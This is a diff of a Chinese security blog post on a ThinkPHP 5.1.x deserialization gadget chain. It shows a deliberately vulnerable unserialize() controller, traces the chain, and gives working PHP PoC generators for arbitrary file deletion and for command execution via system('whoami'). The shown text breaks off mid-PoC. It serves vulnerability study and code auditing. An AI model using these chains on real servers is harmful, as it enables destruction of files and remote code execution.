@@ -1,311 +1,341 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-    <meta name="author" content="p0l1st">
-
-
-
-    <meta name="description" content="blog">
-
-
-
-<title>ThinkPHP5.1.X反序列化利用链 | p0l1st&#39;s blog</title>
-
-
-
-    <link rel="icon" href="/b.png">
-
-
-
-
-    <!-- stylesheets list from _config.yml -->
     
-    <link rel="stylesheet" href="/css/style.css">
+    <title>
+        ThinkPHP5.1.X反序列化利用链 |
+        
+        p0l1st&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="漏洞环境ThinkPHP5.1.37 application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller;  class Index &amp;#123;     public function index()     &amp;#123;         $u &#x3D; unserialize($_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP5.1.X反序列化利用链">
+<meta property="og:url" content="http://example.com/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="p0l1st&#39;s blog">
+<meta property="og:description" content="漏洞环境ThinkPHP5.1.37 application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller;  class Index &amp;#123;     public function index()     &amp;#123;         $u &#x3D; unserialize($_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821196.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821254.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821679.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821743.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821049.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821206.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821595.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821423.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821731.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821875.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821591.png">
+<meta property="og:image" content="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/10.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822658.png">
+<meta property="article:published_time" content="2024-07-08T04:05:40.000Z">
+<meta property="article:modified_time" content="2024-08-22T10:22:06.133Z">
+<meta property="article:author" content="p0l1st">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png">
     
-
-
-
-    <!-- scripts list from _config.yml -->
-    
-    <script src="/js/script.js"></script>
-    
-    <script src="/js/tocbot.min.js"></script>
-    
-
-
-
     
     
         
+            <link rel="stylesheet" href="http://example.com/css/markdown.css">
+        
+            <link rel="stylesheet" href="http://example.com/css/july.css">
+        
     
-
-
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
 </head>
-
 <body>
-    <script>
-        // this function is used to check current theme before page loaded.
-        (() => {
-            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
-            const isDark = currentTheme === 'dark';
-            const pagebody = document.getElementsByTagName('body')[0]
-            if (isDark) {
-                pagebody.classList.add('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
-            } else {
-                pagebody.classList.remove('dark-theme');
-                // mobile
-                document.getElementById("mobile-toggle-theme").innerText = "· Light"
-            }
-        })();
-    </script>
 
-    <div class="wrapper">
-        <header>
-    <nav class="navbar">
-        <div class="container">
-            <div class="navbar-header header-logo"><a href="/">p0l1st&#39;s Blog</a></div>
-            <div class="menu navbar-right">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                    <a class="menu-item" href="/links">Links</a>
-                
-                <input id="switch_default" type="checkbox" class="switch_default">
-                <label for="switch_default" class="toggleBtn"></label>
-            </div>
-        </div>
-    </nav>
+<div id="banner-outer" class="hidden">
+    <div id="banner-image" style="background-image: url()"></div>
+    <img src="https://www.gravatar.com/avatar/7a585313ed855e8d652cbb3154a6056e?s=300&amp;d=mm&amp;r=g" id="avatar">
+</div>
 
-    
-    <nav class="navbar-mobile" id="nav-mobile">
-        <div class="container">
-            <div class="navbar-header">
-                <div>
-                    <a href="/">p0l1st&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
-                </div>
-                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
-            </div>
-            <div class="menu" id="mobile-menu">
-                
-                    <a class="menu-item" href="/archives">Posts</a>
-                
-                    <a class="menu-item" href="/about">About</a>
-                
-                    <a class="menu-item" href="/links">Links</a>
-                
-            </div>
-        </div>
-    </nav>
-
-</header>
-<script>
-    var mobileBtn = function f() {
-        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
-        var mobileMenu = document.getElementById("mobile-menu");
-        if(toggleMenu.classList.contains("active")){
-           toggleMenu.classList.remove("active")
-            mobileMenu.classList.remove("active")
-        }else{
-            toggleMenu.classList.add("active")
-            mobileMenu.classList.add("active")
-        }
-    }
-</script>
-            <div class="main">
-                <div class="container">
-    
-    
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
+<div id="menu-outer">
+    <div id="menu-inner">
+        
+            <a class="false" href="http://example.com/index.html">Home</a>
+        
+            <a class="false" href="http://example.com/archives/index.html">Archives</a>
+        
+            <a class="false" href="http://example.com/about/index.html">About</a>
+        
     </div>
 </div>
 
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
-
-    
-    <article class="post-wrap">
-        <header class="post-header">
-            <h1 class="post-title">ThinkPHP5.1.X反序列化利用链</h1>
-            
-                <div class="post-meta">
-                    
-                        Author: <a itemprop="author" rel="author" href="/">p0l1st</a>
-                    
-
-                    
-                        <span class="post-time">
-                        Date: <a href="#">July 8, 2024&nbsp;&nbsp;12:05:40</a>
-                        </span>
-                    
-                    
-                </div>
-            
-        </header>
-
-        <div class="post-content">
-            <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>ThinkPHP5.1.37</p>
+<div id="content-outer" class="container">
+    <div id="content-inner">
+        <article id="post">
+    <h1 id="post-title">ThinkPHP5.1.X反序列化利用链</h1>
+    <time id="post-date" datetime="2024-07-08T04:05:40.000Z">
+        July 08, 2024
+    </time>
+    <div id="post-content" class="markdown-body">
+        <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>ThinkPHP5.1.37</p>
 <p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$u</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hhh&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
 
+class Index
+&#123;
+    public function index()
+    &#123;
+        $u = unserialize($_GET[&#39;c&#39;]);
+        return &#39;hhh&#39;;
+    &#125;
 
-
+    public function hello($name = &#39;ThinkPHP5&#39;)
+    &#123;
+        return &#39;hello,&#39; . $name;
+    &#125;
+&#125;
+</code></pre>
 <h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
 <li>有一个内容完全可控的反序列化点:unserialize(可控变量)</li>
 <li>存在文件上传、文件名可控、使用了文件操作函数:file_exists(‘phar:&#x2F;&#x2F;‘)</li>
 </ul>
 <h1 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h1><p>首先全局搜索_destruct()</p>
-<p><img src="/../images/image-20240708121433119.png" alt="image-20240708121433119"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png" alt="image-20240708121433119"></p>
 <p>然后跟进windows类的_destruct方法，发现调用了removeFiles方法，继续跟进</p>
-<p><img src="/../images/image-20240708121529761.png" alt="image-20240708121529761"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821196.png" alt="image-20240708121529761"></p>
 <p>可以看到在这里使用了file_exists对filename进行判断，这里的filename是可控的，并且跟进file_exists可以发现filename被当作字符串，那么就会触发_toString方法</p>
-<p><img src="/../images/image-20240708121618417.png" alt="image-20240708121618417"></p>
-<p><img src="/../images/image-20240708121836989.png" alt="image-20240708121836989"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821254.png" alt="image-20240708121618417"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821679.png" alt="image-20240708121836989"></p>
 <p>全局搜索可利用的_toString方法，选择Conversion类，发现调用了toJson方法，跟进看看</p>
-<p><img src="/../images/image-20240708122013007.png" alt="image-20240708122013007"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821743.png" alt="image-20240708122013007"></p>
 <p>又调用了toArray方法，继续跟进</p>
-<p><img src="/../images/image-20240708122126632.png" alt="image-20240708122126632"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821049.png" alt="image-20240708122126632"></p>
 <p>这里的$relation来自$this-&gt;data[$name]，$name来自$this-&gt;append，都是可控的</p>
 <p>所以$relation-&gt;visible($name)就变成了：**可控类-&gt;visible(可控变量)**，接下来就需要找可利用的visible方法或_call方法</p>
-<p><img src="/../images/image-20240708132448330.png" alt="image-20240708132448330"></p>
-<p><img src="/../images/image-20240708132131155.png" alt="image-20240708132131155"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821206.png" alt="image-20240708132448330"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821595.png" alt="image-20240708132131155"></p>
 <p>全局搜索并没有找到可以利用的visible，搜索_call发现Request类比较好利用，这里的call_user_func_array第一个参数可控，可以传入一个数组，构造call_user_func_array(array(任意类，任意方法), $args)就可以调用任意类的任意方法</p>
-<p><img src="/../images/image-20240708133414554.png" alt="image-20240708133414554"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821423.png" alt="image-20240708133414554"></p>
 <p>但是array_unshift($args, $this)把本类对象放在$args的第一个，我们需要寻找不受这个参数影响的方法</p>
 <p>通过前面分析RCE漏洞我们知道Request类中的input方法可以通过调用filterValue进而调用call_user_func，但是$args的第一个元素是一个固定死的类对象，所以这里不能直接调用input方法，而应该寻找调用input的方法</p>
-<p><img src="/../images/image-20240708135710657.png" alt="image-20240708135710657"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821731.png" alt="image-20240708135710657"></p>
 <p>调用input的方法共有七处，这里选择Request类中的param方法</p>
-<p><img src="/../images/image-20240708140724987.png" alt="image-20240708140724987"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821875.png" alt="image-20240708140724987"></p>
 <p>继续寻找调用了param的方法，发现有isAjax和isPjax，它们传入param方法的第一个参数都可控</p>
-<p><img src="/../images/image-20240708141254668.png" alt="image-20240708141254668"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821591.png" alt="image-20240708141254668"></p>
 <p>至此漏洞链构造完成</p>
 <p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/10.png" alt="10"></p>
 <h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>任意文件删除</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;files=[<span class="string">&#x27;需要删除文件的路径&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>
+<pre><code class="php">namespace think\process\pipes;
 
+class Pipes&#123;
+
+&#125;
+
+class Windows extends Pipes
+&#123;
+private $files = [];
+
+public function __construct()
+&#123;
+$this-&gt;files=[&#39;需要删除文件的路径&#39;];
+&#125;
+&#125;
+
+echo base64_encode(serialize(new Windows()));
+</code></pre>
 <p>RCE</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;poc&quot;</span>=&gt;[<span class="string">&quot; &quot;</span>,<span class="string">&quot; &quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;poc&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$mergeParam</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;<span class="comment">//回调时调用的PHP函数</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];<span class="comment">//在isAjax方法传递给param方法的$name绕过param方法的一些操作，但主要是为了绕过input方法里面对$data的改变</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];<span class="comment">//在__call里面调用isAjax</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam=<span class="literal">true</span>;<span class="comment">//绕过param方法里的一些操作</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;param=[<span class="string">&quot;whoami&quot;</span>,<span class="string">&quot;&quot;</span>];<span class="comment">//input方法的$data,也是即将执行的命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span>=[]</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="variable">$files</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>&#123;</span><br><span class="line">    <span class="title class_">trait</span> <span class="title class_">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">visible</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$relation</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$relation</span>=[],<span class="variable">$visible</span>=[],<span class="variable">$data</span>=[],<span class="variable">$withAttr</span>=[]</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable 